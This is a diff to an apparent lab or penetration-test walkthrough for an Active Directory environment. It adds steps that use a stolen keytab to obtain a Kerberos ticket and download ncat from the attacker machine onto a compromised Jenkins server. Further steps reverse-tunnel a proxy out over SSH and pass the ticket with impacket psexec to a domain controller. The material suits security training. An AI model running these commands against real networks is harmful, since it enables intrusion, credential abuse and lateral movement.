@@ -8,6 +8,8 @@
   - [Domain Enumeration on Linux](#domain-enumeration-on-linux)
   - [Privilege Escalation to support](#privilege-escalation-to-support)
   - [Requests using support keytab](#requests-using-support-keytab)
+  - [Setting Jenkin server as HTTP SOCKS Proxy](#setting-jenkin-server-as-http-socks-proxy)
+  - [Pass-the-Ticket](#pass-the-ticket)
 
 ---
 
@@ -251,6 +253,11 @@ In the previous section, we identified `/home/support@operations.atomic.site/adm
 With the keytab file, we can request for TGT:
 
 ```
+cd /home/support\@operations.atomic.site/
+```
+
+
+```
 kinit adm_domain@OPERATIONS.ATOMIC.SITE -k -t adm_domain.keytab
 ```
 * Note that the `@` part should be in CAPITAL LETTERS.
@@ -313,4 +320,95 @@ echo -n "<copied string>" | base64 -d > krb5cc_123
 
 
 <br/>
+
+## Setting Jenkin server as HTTP SOCKS Proxy
+
+First download `ncat` on Kali Linux:
+
+```
+wget https://github.com/ZephrFish/static-tools/raw/master/ncat
+``` 
+
+<br/>
+
+Serve `ncat` on the current directory using python http.server:
+
+```
+python3 -m http.server 80
+```
+
+![picture 6](images/e6b1a9dac987e11af73d111897df45a63d29a11cbbd46ed4724031460265fd31.png)  
+
+<br/>
+
+Then on the Jenkin machine, download the served `ncat`:
+
+```
+wget http://192.168.100.11/ncat
+```
+![picture 7](images/adc8f705ccec32b48462b787c4d60278fe99610c5313200d5cbd56b2e653b9a3.png)  
+
+<br/>
+
+Use `ncat` to setup a http socks proxy:
+
+```
+chmod +x ncat
+```
+
+```
+./ncat -l 4444 --proxy-type http &
+```
+
+![picture 8](images/4e38b7d8a6220cf618550220cd9f5763e090e4bf35e16aa1da2c04648d20e7d6.png)  
+
+<br/>
+
+Then do a reverse port forwarding using the tunnel on the Jenkins machine:
+```
+ssh -R 4445:127.0.0.1:4444 brian@192.168.100.11
+```
+![picture 9](images/6854041dabbd37e6a221ff5fe47908ffe585c5bbeb25ee8cd48ddd76b1f1582a.png)  
+
+<br/>
+
+Now check the listening ports on the attacker machine using `netstat`:
+
+```
+netstat -antup | grep 4445
+```
+
+![picture 10](images/169782a784c91c2a340e63747d62f593caf7f85d565fabd216929d163153578c.png)  
+
+<br/>
+
+Then change the http socks port in  `/etc/proxychains.conf`:
+![picture 12](images/e6ec86dfb4b64730a2e324c99c720a7f3f6ca780e1db4cc01356344fae60ace8.png)  
+ 
+
+<br/>
+
+## Pass-the-Ticket
+
+To use krb ticket, first install the following package:
+
+```
+apt install -y krb5-user
+```
+
+<br/>
+
+Then use impacket to pass-the-ticket:
+
+```
+export KRB5CCNAME=./krb5cc_123
+```
+
+```
+echo "10.1.1.2 OPS-CHILDDC" >> /etc/hosts
+```
+
+```
+proxychains psexec.py -k -no-pass -debug -dc-ip 10.1.1.2 adm_domain@OPS-CHILDDC
+```
 
